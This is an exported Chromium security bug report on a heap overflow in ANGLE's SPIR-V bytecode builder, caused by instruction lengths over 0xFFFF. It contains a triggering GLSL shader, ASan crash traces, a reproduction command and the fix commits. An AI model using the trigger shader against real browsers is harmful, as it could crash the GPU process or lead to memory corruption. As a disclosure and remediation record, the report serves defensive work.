# Security: WebGL Vulkan Spirv bytecode builder length truncate lead to heap overflow

| Field | Value |
|-------|-------|
| **Issue ID** | [40945594](https://issues.chromium.org/issues/40945594) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>GPU>ANGLE, Internals>GPU>SwiftShader |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | d8...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2023-11-24 |
| **Bounty** | $15,000.00 |

## Description

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**

Chrome, when utilizing Vulkan as its backend, compiles vertex shader programs to SPIRV format.

The issue arises during the compilation of a specific shader program, detailed as follows

```
struct S {  
            int array[0x10];  
        };  
  
        layout(std140) uniform structBuffer { S s; } buffer;  
  
        void dummy(S s)  
        {  
        }  
  
        void main()  
        {  
            dummy(buffer.s);  
        }  

```

In the process of generating SPIRV bytecode, the variable buffer.s is flattened to be passed as an argument to the dummy function.

This process results in SPIRV bytecode output resembling:

```
%141 = OpCompositeConstruct %59(0x3b) %125(0x7d) %126(0x7e) %127(0x7f) %128(0x80) %129(0x81) %130(0x82) %131(0x83) %132(0x84) %133(0x85) %134(0x86) %135(0x87) %136(0x88) %137(0x89) %138(0x8a) %139(0x8b) %140(0x8c)  
%142 = OpCompositeConstruct %60(0x3c) %141(0x8d)  
OpStore %119(0x77) %142(0x8e)  
%143 = OpFunctionCall %3(0x3) %63(0x3f) %119(0x77)  

```

The critical function here is MakeLengthOp (1) , which encodes length and opcode into a 32-bit format.  

This function encounters issues when the length of parameters to construct OpCompositeConstruct (2) exceeds 0xffff, triggering only a debug assert.  

A slight alteration in the shader program, like changing the structure S, can trigger the assert:

```
struct S {  
            int array[0x10001];  
        };  
  

```

we can trigger the assert:

```
Warning: spirv_instruction_builder_autogen.cpp:25 (MakeLengthOp):       ! Assert failed in MakeLengthOp (../../src/common/spirv/spirv_instruction_builder_autogen.cpp:25): length <= 0xFFFFu  
WARN: spirv_instruction_builder_autogen.cpp:25 (MakeLengthOp):  ! Assert failed in MakeLengthOp (../../src/common/spirv/spirv_instruction_builder_autogen.cpp:25): length <= 0xFFFFu  

```

By manipulating the length of the opcode, an attacker can potentially make the parser read out-of-bound values, allowing for the injection of arbitrary SPIRV bytecode.  

This vulnerability is of critical severity, especially since it can be exploited directly from JavaScript, potentially granting GPU privilege permissions.  

As noted by P0 ( 1422594 )

```
However, regardless, ANGLE provides limited validation on the SPIRV bytecode  
before passing it to the driver-provided GL implementation, so it seems very  
likely that an attacker can use access to GL_ShaderBinary to trigger  
memory corruption in the driver, which does not expect untrusted bytecode input.  
  
In addition, it looks like ANGLE's SPIRV transformer is not designed for  
untrusted input - providing malformed input can result in many different  
crashes, most of which result from wild accesses into std::vector or std::array,  
which should be mitigated by libc++ hardening checks.  

```

1.<https://source.chromium.org/chromium/chromium/src/+/main:third_party/angle/src/common/spirv/spirv_instruction_builder_autogen.cpp;l=25>

2.<https://source.chromium.org/chromium/chromium/src/+/main:third_party/angle/src/common/spirv/spirv_instruction_builder_autogen.cpp;l=790;drc=d4a7d3fb6f5100019d6153d5cf00c60f06b1d0a2;bpv=0;bpt=1>

**VERSION**  

Chrome Version: All version + Channels  

Operating System: All OS

REPRODUCTION:  

run chrome asan build official with poc  

./chrome -use-gl=angle -use-angle=swiftshader <http://localhost:8000/poc2.html>

When build with asan debug symbol we obtained the stack trace similar to <https://crbug.com/chromium/1422594>

```
==918895==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f4e14aa433c at pc 0x55dd5fcfa7c4 bp 0x7ffda0afb4d0 sp 0x7ffda0afac90  
READ of size 236 at 0x7f4e14aa433c thread T0  
    #0 0x55dd5fcfa7c3 in __asan_memmove /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:71:3  
    #1 0x7f4e3c34873d in __constexpr_memmove<unsigned int, const unsigned int, 0> third_party/libc++/src/include/__string/constexpr_c_functions.h:212:5  
    #2 0x7f4e3c34873d in __copy_trivial_impl<const unsigned int, unsigned int> third_party/libc++/src/include/__algorithm/copy_move_common.h:66:3  
    #3 0x7f4e3c34873d in operator()<const unsigned int, unsigned int, 0> third_party/libc++/src/include/__algorithm/copy.h:103:12  
    #4 0x7f4e3c34873d in __unwrap_and_dispatch<std::__Cr::__overload<std::__Cr::__copy_loop<std::__Cr::_ClassicAlgPolicy>, std::__Cr::__copy_trivial>, const unsigned int \*, const unsigned int \*, unsigned int \*, 0> third_party/libc++/src/include/__algorithm/copy_move_common.h:109:19  
    #5 0x7f4e3c34873d in __dispatch_copy_or_move<std::__Cr::_ClassicAlgPolicy, std::__Cr::__copy_loop<std::__Cr::_ClassicAlgPolicy>, std::__Cr::__copy_trivial, const unsigned int \*, const unsigned int \*, unsigned int \*> third_party/libc++/src/include/__algorithm/copy_move_common.h:133:10  
    #6 0x7f4e3c34873d in __copy<std::__Cr::_ClassicAlgPolicy, const unsigned int \*, const unsigned int \*, unsigned int \*> third_party/libc++/src/include/__algorithm/copy.h:110:10  
    #7 0x7f4e3c34873d in copy<const unsigned int \*, unsigned int \*> third_party/libc++/src/include/__algorithm/copy.h:117:10  
    #8 0x7f4e3c34873d in __uninitialized_allocator_copy_impl<std::__Cr::allocator<unsigned int>, const unsigned int, unsigned int, unsigned int, nullptr> third_party/libc++/src/include/__memory/uninitialized_algorithms.h:596:12  
    #9 0x7f4e3c34873d in __uninitialized_allocator_copy<std::__Cr::allocator<unsigned int>, const unsigned int \*, const unsigned int \*, unsigned int \*> third_party/libc++/src/include/__memory/uninitialized_algorithms.h:603:21  
    #10 0x7f4e3c34873d in __construct_at_end<const unsigned int \*, const unsigned int \*> third_party/libc++/src/include/vector:1145:17  
    #11 0x7f4e3c34873d in std::__Cr::__wrap_iter<unsigned int\*> std::__Cr::vector<unsigned int, std::__Cr::allocator<unsigned int>>::__insert_with_size<unsigned int const\*, unsigned int const\*>(std::__Cr::__wrap_iter<unsigned int const\*>, unsigned int const\*, unsigned int const\*, long) third_party/libc++/src/include/vector:1962:17  
    #12 0x7f4e3c327e8f in insert<const unsigned int \*, 0> third_party/libc++/src/include/vector:1938:10  
    #13 0x7f4e3c327e8f in copyInstruction src/libANGLE/renderer/vulkan/spv_utils.cpp:959:20  
    #14 0x7f4e3c327e8f in rx::(anonymous namespace)::SpirvTransformer::transformInstruction() src/libANGLE/renderer/vulkan/spv_utils.cpp:3579:9  
    #15 0x7f4e3c31ae57 in rx::(anonymous namespace)::SpirvTransformer::transform() src/libANGLE/renderer/vulkan/spv_utils.cpp:3247:9  
    #16 0x7f4e3c3138e6 in rx::SpvTransformSpirvCode(rx::SpvTransformOptions const&, rx::ShaderInterfaceVariableInfoMap const&, std::__Cr::vector<unsigned int, std::__Cr::allocator<unsigned int>> const&, std::__Cr::vector<unsigned int, std::__Cr::allocator<unsigned int>>\*) src/libANGLE/renderer/vulkan/spv_utils.cpp:5416:17  
    #17 0x7f4e3c115179 in ValidateTransformedSpirV src/libANGLE/renderer/vulkan/ProgramExecutableVk.cpp:53:13  
    #18 0x7f4e3c115179 in rx::ShaderInfo::initShaders(rx::vk::Context\*, angle::BitSetT<6ul, unsigned char, gl::ShaderType> const&, angle::PackedEnumMap<gl::ShaderType, std::__Cr::vector<unsigned int, std::__Cr::allocator<unsigned int>> const\*, 6ul> const&, rx::ShaderInterfaceVariableInfoMap const&, bool) src/libANGLE/renderer/vulkan/ProgramExecutableVk.cpp:321:9  
    #19 0x7f4e3c150fd4 in initShaders src/libANGLE/renderer/vulkan/ProgramExecutableVk.h:341:36  
    #20 0x7f4e3c150fd4 in linkImpl src/libANGLE/renderer/vulkan/ProgramVk.cpp:197:5  
    #21 0x7f4e3c150fd4 in rx::(anonymous namespace)::LinkTaskVk::link(gl::ProgramLinkedResources const&, std::__Cr::vector<gl::ProgramVaryingRef, std::__Cr::allocator<gl::ProgramVaryingRef>> const&) src/libANGLE/renderer/vulkan/ProgramVk.cpp:76:32  
    #22 0x7f4e3c154faa in non-virtual thunk to rx::(anonymous namespace)::LinkTaskVk::link(gl::ProgramLinkedResources const&, std::__Cr::vector<gl::ProgramVaryingRef, std::__Cr::allocator<gl::ProgramVaryingRef>> const&) src/libANGLE/renderer/vulkan/ProgramVk.cpp  
    #23 0x7f4e3c85b7f4 in gl::Program::MainLinkTask::linkImpl() src/libANGLE/Program.cpp:674:20  
    #24 0x7f4e3c87efbc in gl::Program::MainLinkTask::operator()() src/libANGLE/Program.cpp:603:44  
    #25 0x7f4e3d07ae2f in angle::SingleThreadedWorkerPool::postWorkerTask(std::__Cr::shared_ptr<angle::Closure>) src/common/WorkerThread.cpp:98:5  

```
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION** ./chrome -use-gl=angle -use-angle=swiftshader <http://localhost:8000/poc2.html> [917760:917760:1124/173319.409593:ERROR:policy\_logger.cc(156)] :components/enterprise/browser/controller/chrome\_browser\_cloud\_management\_controller.cc(161) Cloud management controller initialization aborted as CBCM is not enabled. Please use the `--enable-chrome-browser-cloud-management` command line flag to enable it if you are not using the official Google Chrome build. [917760:917760:1124/173320.232238:ERROR:object\_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object\_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not implemented

==917794==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7effb0987c94 at pc 0x5616c1706303 bp 0x7ffec2d24790 sp 0x7ffec2d23f50  

READ of size 132 at 0x7effb0987c94 thread T0 (chrome)  

==917794==WARNING: invalid path to external symbolizer!  

==917794==WARNING: Failed to use and restart external symbolizer!  

#0 0x5616c1706302 (/mnt/asan-chrome/chrome+0xef83302) (BuildId: d2a77cdb7839e16c)  

#1 0x7effe5e8f86a (/mnt/asan-chrome/libGLESv2.so+0xa8f86a) (BuildId: ecec7f6fe89bf5dd)  

#2 0x7effe5e729aa (/mnt/asan-chrome/libGLESv2.so+0xa729aa) (BuildId: ecec7f6fe89bf5dd)  

#3 0x7effe5e67ed9 (/mnt/asan-chrome/libGLESv2.so+0xa67ed9) (BuildId: ecec7f6fe89bf5dd)  

#4 0x7effe5d0346e (/mnt/asan-chrome/libGLESv2.so+0x90346e) (BuildId: ecec7f6fe89bf5dd)  

#5 0x7effe5d0e68a (/mnt/asan-chrome/libGLESv2.so+0x90e68a) (BuildId: ecec7f6fe89bf5dd)  

#6 0x7effe5d0dd83 (/mnt/asan-chrome/libGLESv2.so+0x90dd83) (BuildId: ecec7f6fe89bf5dd)  

#7 0x7effe5d2559d (/mnt/asan-chrome/libGLESv2.so+0x92559d) (BuildId: ecec7f6fe89bf5dd)  

#8 0x7effe5d25f6a (/mnt/asan-chrome/libGLESv2.so+0x925f6a) (BuildId: ecec7f6fe89bf5dd)  

#9 0x7effe62314c0 (/mnt/asan-chrome/libGLESv2.so+0xe314c0) (BuildId: ecec7f6fe89bf5dd)  

#10 0x7effe624a8b3 (/mnt/asan-chrome/libGLESv2.so+0xe4a8b3) (BuildId: ecec7f6fe89bf5dd)  

#11 0x7effe61814ea (/mnt/asan-chrome/libGLESv2.so+0xd814ea) (BuildId: ecec7f6fe89bf5dd)  

#12 0x7effe6389e8a (/mnt/asan-chrome/libGLESv2.so+0xf89e8a) (BuildId: ecec7f6fe89bf5dd)  

#13 0x5616deb5018d (/mnt/asan-chrome/chrome+0x2c3cd18d) (BuildId: d2a77cdb7839e16c)  

#14 0x5616dead167d (/mnt/asan-chrome/chrome+0x2c34e67d) (BuildId: d2a77cdb7839e16c)  

#15 0x5616df03f58e (/mnt/asan-chrome/chrome+0x2c8bc58e) (BuildId: d2a77cdb7839e16c)  

#16 0x5616df02c31e (/mnt/asan-chrome/chrome+0x2c8a931e) (BuildId: d2a77cdb7839e16c)  

#17 0x5616df02b672 (/mnt/asan-chrome/chrome+0x2c8a8672) (BuildId: d2a77cdb7839e16c)  

#18 0x5616df04cab7 (/mnt/asan-chrome/chrome+0x2c8c9ab7) (BuildId: d2a77cdb7839e16c)  

#19 0x5616df060b84 (/mnt/asan-chrome/chrome+0x2c8ddb84) (BuildId: d2a77cdb7839e16c)  

#20 0x5616df06094c (/mnt/asan-chrome/chrome+0x2c8dd94c) (BuildId: d2a77cdb7839e16c)  

#21 0x5616db817b80 (/mnt/asan-chrome/chrome+0x29094b80) (BuildId: d2a77cdb7839e16c)  

#22 0x5616db815521 (/mnt/asan-chrome/chrome+0x29092521) (BuildId: d2a77cdb7839e16c)  

#23 0x5616db82258f (/mnt/asan-chrome/chrome+0x2909f58f) (BuildId: d2a77cdb7839e16c)  

#24 0x5616d5bdfc1f (/mnt/asan-chrome/chrome+0x2345cc1f) (BuildId: d2a77cdb7839e16c)  

#25 0x5616d5c4c357 (/mnt/asan-chrome/chrome+0x234c9357) (BuildId: d2a77cdb7839e16c)  

#26 0x5616d5c4b06d (/mnt/asan-chrome/chrome+0x234c806d) (BuildId: d2a77cdb7839e16c)  

#27 0x5616d5c4d1ba (/mnt/asan-chrome/chrome+0x234ca1ba) (BuildId: d2a77cdb7839e16c)  

#28 0x5616d5de6a1f (/mnt/asan-chrome/chrome+0x23663a1f) (BuildId: d2a77cdb7839e16c)  

#29 0x5616d5de9e58 (/mnt/asan-chrome/chrome+0x23666e58) (BuildId: d2a77cdb7839e16c)  

#30 0x7effefca1d3a (/lib/x86\_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: c74e800dfd5f72649d673b44292f4a817e45150b)

0x7effb0987c94 is located 0 bytes after 52020372-byte region [0x7effad7eb800,0x7effb0987c94)  

allocated by thread T0 (chrome) here:  

#0 0x5616c173acdd (/mnt/asan-chrome/chrome+0xefb7cdd) (BuildId: d2a77cdb7839e16c)  

#1 0x7effe5d1e1f8 (/mnt/asan-chrome/libGLESv2.so+0x91e1f8) (BuildId: ecec7f6fe89bf5dd)  

#2 0x7effe5d02577 (/mnt/asan-chrome/libGLESv2.so+0x902577) (BuildId: ecec7f6fe89bf5dd)  

#3 0x7effe5d23d3a (/mnt/asan-chrome/libGLESv2.so+0x923d3a) (BuildId: ecec7f6fe89bf5dd)  

#4 0x7effe5d25f6a (/mnt/asan-chrome/libGLESv2.so+0x925f6a) (BuildId: ecec7f6fe89bf5dd)  

#5 0x7effe62314c0 (/mnt/asan-chrome/libGLESv2.so+0xe314c0) (BuildId: ecec7f6fe89bf5dd)  

#6 0x7effe624a8b3 (/mnt/asan-chrome/libGLESv2.so+0xe4a8b3) (BuildId: ecec7f6fe89bf5dd)  

#7 0x7effe61814ea (/mnt/asan-chrome/libGLESv2.so+0xd814ea) (BuildId: ecec7f6fe89bf5dd)  

#8 0x7effe6389e8a (/mnt/asan-chrome/libGLESv2.so+0xf89e8a) (BuildId: ecec7f6fe89bf5dd)  

#9 0x5616deb5018d (/mnt/asan-chrome/chrome+0x2c3cd18d) (BuildId: d2a77cdb7839e16c)  

#10 0x5616dead167d (/mnt/asan-chrome/chrome+0x2c34e67d) (BuildId: d2a77cdb7839e16c)  

#11 0x5616df03f58e (/mnt/asan-chrome/chrome+0x2c8bc58e) (BuildId: d2a77cdb7839e16c)  

#12 0x5616df02c31e (/mnt/asan-chrome/chrome+0x2c8a931e) (BuildId: d2a77cdb7839e16c)  

#13 0x5616df02b672 (/mnt/asan-chrome/chrome+0x2c8a8672) (BuildId: d2a77cdb7839e16c)  

#14 0x5616df04cab7 (/mnt/asan-chrome/chrome+0x2c8c9ab7) (BuildId: d2a77cdb7839e16c)  

#15 0x5616df060b84 (/mnt/asan-chrome/chrome+0x2c8ddb84) (BuildId: d2a77cdb7839e16c)  

#16 0x5616df06094c (/mnt/asan-chrome/chrome+0x2c8dd94c) (BuildId: d2a77cdb7839e16c)  

#17 0x5616db817b80 (/mnt/asan-chrome/chrome+0x29094b80) (BuildId: d2a77cdb7839e16c)  

#18 0x5616db815521 (/mnt/asan-chrome/chrome+0x29092521) (BuildId: d2a77cdb7839e16c)  

#19 0x5616db82258f (/mnt/asan-chrome/chrome+0x2909f58f) (BuildId: d2a77cdb7839e16c)  

#20 0x5616d5bdfc1f (/mnt/asan-chrome/chrome+0x2345cc1f) (BuildId: d2a77cdb7839e16c)  

#21 0x5616d5c4c357 (/mnt/asan-chrome/chrome+0x234c9357) (BuildId: d2a77cdb7839e16c)  

#22 0x5616d5c4b06d (/mnt/asan-chrome/chrome+0x234c806d) (BuildId: d2a77cdb7839e16c)  

#23 0x5616d5c4d1ba (/mnt/asan-chrome/chrome+0x234ca1ba) (BuildId: d2a77cdb7839e16c)  

#24 0x5616d5de6a1f (/mnt/asan-chrome/chrome+0x23663a1f) (BuildId: d2a77cdb7839e16c)  

#25 0x5616d5de9e58 (/mnt/asan-chrome/chrome+0x23666e58) (BuildId: d2a77cdb7839e16c)  

#26 0x7effefca1d3a (/lib/x86\_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: c74e800dfd5f72649d673b44292f4a817e45150b)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/mnt/asan-chrome/chrome+0xef83302) (BuildId: d2a77cdb7839e16c)  

Shadow bytes around the buggy address:  

0x7effb0987a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x7effb0987a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x7effb0987b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x7effb0987b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x7effb0987c00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

=>0x7effb0987c80: 00 00[04]fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x7effb0987d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x7effb0987d80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x7effb0987e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x7effb0987e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x7effb0987f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb

==917794==ADDITIONAL INFO

==917794==Note: Please include this section with the ASan report.  

Task trace:  

#0 0x5616db815b11 (/mnt/asan-chrome/chrome+0x29092b11) (BuildId: d2a77cdb7839e16c)  

#1 0x5616db80dbde (/mnt/asan-chrome/chrome+0x2908abde) (BuildId: d2a77cdb7839e16c)

==917794==END OF ADDITIONAL INFO  

==917794==ABORTING  

[917849:1:1124/173321.808949:ERROR:command\_buffer\_proxy\_impl.cc(323)] GPU state invalid after WaitForGetOffsetInRange.  

[917760:917760:1124/173321.809896:ERROR:gpu\_process\_host.cc(992)] GPU process exited unexpectedly: exit\_code=256  

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**

Reporter credit: Toan (suto) Pham and Tri Dang of Qrious Secure.

## Attachments

- [poc2.html](attachments/poc2.html) (text/plain, 2.1 KB)

## Timeline

### [Deleted User] (2023-11-24)

[Empty comment from Monorail migration]

### d8...@gmail.com (2023-11-24)

I forgot to add one more thing is that the other Opcode also facing this problem as well, as long as the number of param for that opcode can be controlled by attacker.

### el...@chromium.org (2023-11-24)

Thanks for the report! I reproduced the GPU process crash under ASAN, and also the tripping assert. I'll send this over to the GPU team. Given the age of the involved code I'm guessing this affects all shipping versions and OSes.

[Monorail components: Internals>GPU>ANGLE Internals>GPU>SwiftShader]

### [Deleted User] (2023-11-24)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sy...@chromium.org (2023-11-27)

Thank you. The instruction length being limited to 16-bit is a SPIR-V limitation. I'll have to look into why we are generating an instruction that long (instead of just using arrays), that sounds like it should be fixed.

Regardless, this also means that a struct with more than 64K members would face a similar limit. We'll have to reject such shaders.

### gi...@appspot.gserviceaccount.com (2023-12-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/6df603ed4f7b66b2672f64b4188adff0db373ec6

commit 6df603ed4f7b66b2672f64b4188adff0db373ec6
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 18:53:00 2023

Translator: Optimize field-name-collision check

As each field of the struct was encountered, its name was linearly
checked against previously added fields.  That's O(n^2).

The name collision check is now moved to when the struct is completely
defined, and is done with an unordered_map.

Bug: chromium:1505009
Change-Id: If28d738254a541450912eba4ed168424dad9d8be
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5077407
Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>
Reviewed-by: Roman Lavrov <romanl@google.com>

[modify] https://crrev.com/6df603ed4f7b66b2672f64b4188adff0db373ec6/src/compiler/translator/ParseContext.cpp
[modify] https://crrev.com/6df603ed4f7b66b2672f64b4188adff0db373ec6/src/compiler/translator/ParseContext.h
[modify] https://crrev.com/6df603ed4f7b66b2672f64b4188adff0db373ec6/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/6df603ed4f7b66b2672f64b4188adff0db373ec6/src/tests/gl_tests/GLSLTest.cpp


### gi...@appspot.gserviceaccount.com (2023-12-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/caa5e4eafea9ba60071e322dc0cd6951dea62394

commit caa5e4eafea9ba60071e322dc0cd6951dea62394
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 19:12:42 2023

Translator: Fail compilation if too many struct fields

If there are too many struct fields, SPIR-V cannot be produced (as it
has a hard limit of 16383 fields).  The Nvidia GL driver has also been
observed to fail when there are too many fields.

Bug: chromium:1505009
Change-Id: If9b01716c1cab35a6e537da64421e29fe0eda91e
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5074629
Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>
Reviewed-by: Roman Lavrov <romanl@google.com>

[modify] https://crrev.com/caa5e4eafea9ba60071e322dc0cd6951dea62394/src/compiler/translator/ParseContext.cpp
[modify] https://crrev.com/caa5e4eafea9ba60071e322dc0cd6951dea62394/src/tests/compiler_tests/ExpressionLimit_test.cpp
[modify] https://crrev.com/caa5e4eafea9ba60071e322dc0cd6951dea62394/src/compiler/translator/ParseContext.h
[modify] https://crrev.com/caa5e4eafea9ba60071e322dc0cd6951dea62394/src/tests/gl_tests/GLSLTest.cpp


### gi...@appspot.gserviceaccount.com (2023-12-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/031f40c36639f57f056eb3b06dc44b520ab03442

commit 031f40c36639f57f056eb3b06dc44b520ab03442
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Sat Dec 02 09:01:38 2023

Roll ANGLE from ab992c3efe0f to 90767546353c (9 revisions)

https://chromium.googlesource.com/angle/angle.git/+log/ab992c3efe0f..90767546353c

2023-12-02 cclao@google.com Vulkan: Add test for __samplerExternal2DY2YEXT then swizzle
2023-12-02 cnorthrop@google.com Tests: Add AFK Arena trace
2023-12-01 syoussefi@chromium.org Translator: Fail compilation if too many struct fields
2023-12-01 mark@lunarg.com Tests: Add Walking Dead Survivors trace
2023-12-01 syoussefi@chromium.org Translator: Optimize field-name-collision check
2023-12-01 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll vulkan-deps from f4204cd3fb57 to 66a2496b8cff (1 revision)
2023-12-01 sergeyka@chromium.org Metal should not inline non-const global initialisers
2023-12-01 angle-autoroll@skia-public.iam.gserviceaccount.com Roll VK-GL-CTS from faf4fbbc8f8e to af594bc856e5 (11 revisions)
2023-12-01 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll Chromium from 996514892366 to d0afe9132509 (733 revisions)

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/angle-chromium-autoroll
Please CC angle-team@google.com,romanl@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://issues.skia.org/issues/new?component=1389291&template=1850622

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
Bug: chromium:1505009
Tbr: romanl@google.com
Test: Test: angle_trace_tests --gtest_filter="*afk_arena*"
Test: Test: angle_trace_tests --gtest_filter=TraceTest.walking_dead_survivors
Change-Id: Id5c81e0b9f7878940db5ab5b2cd68a834e3edfad
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5081030
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1232363}

[modify] https://crrev.com/031f40c36639f57f056eb3b06dc44b520ab03442/DEPS
[modify] https://crrev.com/031f40c36639f57f056eb3b06dc44b520ab03442/third_party/angle


### [Deleted User] (2023-12-05)

[Empty comment from Monorail migration]

### [Deleted User] (2023-12-06)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-12-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/dc4b1acd485911b927d354ee2a2e19414ede178e

commit dc4b1acd485911b927d354ee2a2e19414ede178e
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date: Thu Nov 30 20:42:32 2023

Translator: Limit private variable size to 64KB

This is indirectly fixing an issue where passing large arrays in SPIR-V
such that an internal cast is needed (such as array inside interface
block copied to local varaible) causes an overflow of the instruction
length limit (in the absence of OpCopyLogical).

By limiting the size of private variables to 32KB, this limitation is
indirectly enforced.  It was observed that all the test shaders added in
this CL fail on the Nvidia OpenGL drivers, so such a limit seems to be
reasonble.

Bug: chromium:1505009
Change-Id: Ia36134b2bf8501a5b875814db3566be28b183e0f
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5077408
Reviewed-by: Charlie Lao <cclao@google.com>
Reviewed-by: Geoff Lang <geofflang@chromium.org>
Commit-Queue: Shahbaz Youssefi <syoussefi@chromium.org>

[modify] https://crrev.com/dc4b1acd485911b927d354ee2a2e19414ede178e/src/tests/compiler_tests/RecordConstantPrecision_test.cpp
[modify] https://crrev.com/dc4b1acd485911b927d354ee2a2e19414ede178e/src/compiler/translator/ValidateTypeSizeLimitations.cpp
[modify] https://crrev.com/dc4b1acd485911b927d354ee2a2e19414ede178e/src/compiler/translator/Compiler.cpp
[modify] https://crrev.com/dc4b1acd485911b927d354ee2a2e19414ede178e/src/tests/angle_end2end_tests_expectations.txt
[modify] https://crrev.com/dc4b1acd485911b927d354ee2a2e19414ede178e/src/tests/gl_tests/GLSLTest.cpp


### sy...@chromium.org (2023-12-06)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-12-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/63dab611179711c7fc5bf52c32a374aa3926093f

commit 63dab611179711c7fc5bf52c32a374aa3926093f
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Dec 07 01:32:34 2023

Roll ANGLE from 6d9f0aee9026 to dc4b1acd4859 (2 revisions)

https://chromium.googlesource.com/angle/angle.git/+log/6d9f0aee9026..dc4b1acd4859

2023-12-06 syoussefi@chromium.org Translator: Limit private variable size to 64KB
2023-12-06 syoussefi@chromium.org Remove team members no longer part of the project

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/angle-chromium-autoroll
Please CC abdolrashidi@google.com,angle-team@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://issues.skia.org/issues/new?component=1389291&template=1850622

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
Bug: chromium:1505009
Tbr: abdolrashidi@google.com
Change-Id: I8cf06a28f500a24caa8efe3533406435dd443995
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5097195
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1234290}

[modify] https://crrev.com/63dab611179711c7fc5bf52c32a374aa3926093f/DEPS
[modify] https://crrev.com/63dab611179711c7fc5bf52c32a374aa3926093f/third_party/angle


### [Deleted User] (2023-12-07)

